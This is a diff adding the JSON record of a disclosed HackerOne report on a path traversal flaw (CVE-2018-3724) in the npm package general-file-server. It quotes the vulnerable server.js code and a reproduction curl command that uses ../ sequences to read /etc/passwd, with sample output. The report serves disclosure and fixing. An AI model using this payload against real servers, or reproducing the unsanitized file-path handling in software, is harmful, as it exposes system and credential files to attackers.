@@ -1,0 +1,136 @@
+{
+  "id": 310943,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTA5NDM=",
+  "url": "https://hackerone.com/reports/310943",
+  "title": "[general-file-server] Path Traversal vulnerability allows to read content on arbitrary file on the server",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-31T13:35:55.843Z",
+  "submitted_at": "2018-01-31T13:35:55.843Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3724"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-10T14:31:20.387Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-03-10T14:30:51.784Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal in general-file-server module.\nIt allows to read content of arbitrary files on the remote server.\n\n## Module\n\n**general-file-server**\n\nThis is a general file server made by nodejs. It will be easy for you to access the files on the server through the browser.\n\nhttps://www.npmjs.com/package/general-file-server\n\nversion: 1.1.8\n\nStats\n1 download in the last day\n17 downloads in the last week\n67 downloads in the last month\n\n~750 estimated downloads per year\n\n\n## Description\n\nLack of file path sanitization causes that any file on the server might be read by malicious user, despite the fact that there is ```root_path``` setting in module's ```config.js``` file:\n\n```javascript\n// sample config.js\nmodule.exports = {\n    hostname: '127.0.0.1',\n    port: 8080,\n    root_path: \"./\",\n    title: \"General File Server\",\n    logo_link: \"/____statics/logo.png\"\n}\n```\n\nHere's the code which causes issue:\n\n```javascript\n// node_modules/general-file-server/server.js, line 77\nif (pathname.search('____statics') == 1) {\n        currpath = __dirname + pathname\n\n        fs.stat(currpath, function (err, stat) {\n            if (err || stat.isDirectory()) {\n                endupwith404(res)\n            } else {\n                res.writeHeader(200, {\n                    'Content-Type': mime.lookup(currpath)\n                })\n                fs.createReadStream(currpath).pipe(res)\n            }\n        })\n    }\n```\n\nAs you can see, ```currpath``` is passed to ```fs.createFileStream()``` and piped directly into Response object withou any sanitization against Path Traversal.\n\n\n## Steps To Reproduce:\n\n\n- install ```general-file-server```:\n\n```\n$ npm install general-file-server\n```\n\n- run ```general-file-server``` in direcotry of your choice. It will use settings from ```config.js``` file:\n\n```\nme:~/playground/hackerone/Node$ ./node_modules/general-file-server/server.js\n> serving \"./\" http://127.0.0.1:8080\n```\n\n- execute following ```curl``` command (adjust number of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../etc/passwd\n```\n\n- see result:\n\n```\n*   Trying 127.0.0.1...\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n> GET /../../../../../../etc/passwd HTTP/1.1\n> Host: 127.0.0.1:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Content-Type: application/octet-stream\n< Date: Wed, 31 Jan 2018 12:53:13 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n(...)\n```\n\n## Supporting Material/References:\n\n\n- Ubuntu 16.04 LTS\n- Chromium 66.0.3333.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.4 LTS\n- npm version: 5.6.0\n- curl 7.47.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows malicious user to read content of any file on the server",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-04-09T14:30:51.866Z",
+  "allow_singular_disclosure_after": -255056028.68884596,
+  "singular_disclosure_allowed": true,
+  "vote_count": 9,
+  "voters": [
+    "tomnomnom",
+    "muon4",
+    "muhammad_uwais",
+    "eveeez",
+    "x1m",
+    "khalooda0x",
+    "japz",
+    "plaba",
+    "try_to_bug"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 5781,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "general-file-server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
